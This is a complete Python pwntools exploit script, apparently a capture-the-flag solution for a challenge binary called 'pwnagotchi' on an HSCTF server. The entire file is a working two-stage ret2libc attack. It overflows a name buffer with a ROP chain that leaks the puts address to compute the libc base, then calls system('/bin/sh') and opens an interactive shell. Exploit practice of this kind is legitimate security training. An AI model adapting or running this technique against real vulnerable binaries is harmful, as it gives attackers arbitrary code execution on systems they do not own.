from pwn import *

if len(sys.argv) > 1:
	sh=remote("pwn.hsctf.com",5005)
	libc=ELF("libc6_2.27-3ubuntu1_amd64.so")
else:
	sh=process("./pwnagotchi")
	libc=ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so")


exe=ELF("pwnagotchi")

# gdb.attach(sh)
p= 'a'*20
p+= p64(0x00000000004009f3)  # pop rdi; ret
p+= p64(exe.got['puts'])
p+= p64(exe.plt['puts'])
p+= p64(0x00000000004007e7) # eat
p+= p64(0x0000000000400801) # zzz
p+= p64(0x0000000000400846) # main

sh.sendlineafter("name:",p)
sh.recvuntil("happy!\n")

leak=u64(sh.recv(6).ljust(8,"\x00"))
log.info("leak : "+str(hex(leak)))
log.info("libc_base : " + str(hex(leak - libc.sym["puts"])))
libc.address=leak - libc.sym["puts"]


p= 'a'*20
p+= p64(0x00000000004009f3)
p+= p64(libc.search("/bin/sh").next())
p+= p64(0x0000000000400285)
p+= p64(libc.sym["system"])

sh.sendlineafter("name: ",p)
sh.recvuntil("happy!\n")

sh.interactive()